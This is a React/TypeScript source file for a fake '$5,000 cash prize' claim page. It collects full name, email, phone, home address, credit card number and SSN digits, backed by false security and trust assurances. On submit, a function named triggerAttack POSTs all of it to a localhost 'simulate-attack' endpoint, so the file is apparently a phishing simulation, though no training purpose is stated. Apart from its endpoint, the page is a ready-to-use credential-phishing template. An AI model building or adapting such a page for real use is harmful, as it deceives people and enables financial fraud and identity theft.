import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import { Gift, TrendingUp, Shield, DollarSign } from "lucide-react";

const DataCollectionPage = () => {
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    phone: "",
    address: "",
    creditCard: "",
    ssn: ""
  });
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();
  const navigate = useNavigate();

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const triggerAttack = async () => {
    setLoading(true);
    try {
      const response = await fetch('http://localhost:4000/api/simulate-attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          userData: formData,
          source: 'data_collection_form'
        })
      });
      const result = await response.json();
      
      if (result.ok) {
        toast({
          title: "🎉 Processing Complete!",
          description: "Your information has been verified. Redirecting...",
          variant: "default",
        });
        
        // Redirect to dashboard after 2 seconds
        setTimeout(() => {
          navigate('/dashboard');
        }, 2000);
      }
    } catch (error) {
      console.error('Attack failed:', error);
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    triggerAttack();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-50 to-blue-50">
      {/* Header */}
      <header className="bg-primary text-primary-foreground p-4 shadow-lg">
        <div className="container mx-auto">
          <h1 className="text-2xl font-bold flex items-center gap-2">
            <Gift className="h-6 w-6" />
            Congratulations! You've Won!
          </h1>
          <p className="text-sm opacity-90">Complete your details to claim your prize</p>
        </div>
      </header>

      <div className="container mx-auto p-4 max-w-2xl">
        {/* Prize announcement */}
        <Card className="mb-6 border-2 border-yellow-400 bg-gradient-to-r from-yellow-50 to-orange-50">
          <CardHeader className="text-center">
            <div className="flex justify-center mb-4">
              <div className="bg-yellow-400 p-4 rounded-full">
                <TrendingUp className="h-8 w-8 text-yellow-800" />
              </div>
            </div>
            <CardTitle className="text-2xl text-yellow-800">
              🎉 You've Won $5,000 Cash Prize! 🎉
            </CardTitle>
            <p className="text-yellow-700">
              You are one of our lucky winners! Complete the form below to receive your prize money directly to your account.
            </p>
          </CardHeader>
        </Card>

        {/* Data collection form */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Shield className="h-5 w-5 text-green-600" />
              Secure Prize Claim Form
            </CardTitle>
            <p className="text-muted-foreground text-sm">
              All information is encrypted and secure. We need these details to verify your identity and process your prize.
            </p>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <Label htmlFor="fullName">Full Legal Name *</Label>
                <Input
                  id="fullName"
                  value={formData.fullName}
                  onChange={(e) => handleInputChange("fullName", e.target.value)}
                  placeholder="Enter your full legal name"
                  required
                />
              </div>

              <div>
                <Label htmlFor="email">Email Address *</Label>
                <Input
                  id="email"
                  type="email"
                  value={formData.email}
                  onChange={(e) => handleInputChange("email", e.target.value)}
                  placeholder="Enter your email address"
                  required
                />
              </div>

              <div>
                <Label htmlFor="phone">Phone Number *</Label>
                <Input
                  id="phone"
                  value={formData.phone}
                  onChange={(e) => handleInputChange("phone", e.target.value)}
                  placeholder="Enter your phone number"
                  required
                />
              </div>

              <div>
                <Label htmlFor="address">Home Address *</Label>
                <Input
                  id="address"
                  value={formData.address}
                  onChange={(e) => handleInputChange("address", e.target.value)}
                  placeholder="Enter your complete address"
                  required
                />
              </div>

              <div>
                <Label htmlFor="creditCard">Credit Card Number (for verification) *</Label>
                <Input
                  id="creditCard"
                  value={formData.creditCard}
                  onChange={(e) => handleInputChange("creditCard", e.target.value)}
                  placeholder="Enter your credit card number"
                  required
                />
                <p className="text-xs text-muted-foreground mt-1">
                  Required for identity verification only. No charges will be made.
                </p>
              </div>

              <div>
                <Label htmlFor="ssn">Social Security Number (last 4 digits) *</Label>
                <Input
                  id="ssn"
                  value={formData.ssn}
                  onChange={(e) => handleInputChange("ssn", e.target.value)}
                  placeholder="Enter last 4 digits of SSN"
                  maxLength={4}
                  required
                />
                <p className="text-xs text-muted-foreground mt-1">
                  Required for tax reporting purposes.
                </p>
              </div>

              <Button 
                type="submit" 
                className="w-full bg-green-600 hover:bg-green-700 text-white"
                disabled={loading}
              >
                {loading ? (
                  "Processing..."
                ) : (
                  <>
                    <DollarSign className="h-4 w-4 mr-2" />
                    Claim My $5,000 Prize Now!
                  </>
                )}
              </Button>
            </form>

            {/* Trust indicators */}
            <div className="mt-6 pt-4 border-t">
              <div className="flex items-center justify-center gap-4 text-xs text-muted-foreground">
                <div className="flex items-center gap-1">
                  <Shield className="h-3 w-3 text-green-600" />
                  SSL Encrypted
                </div>
                <div>•</div>
                <div>Bank Level Security</div>
                <div>•</div>
                <div>Trusted by Millions</div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default DataCollectionPage;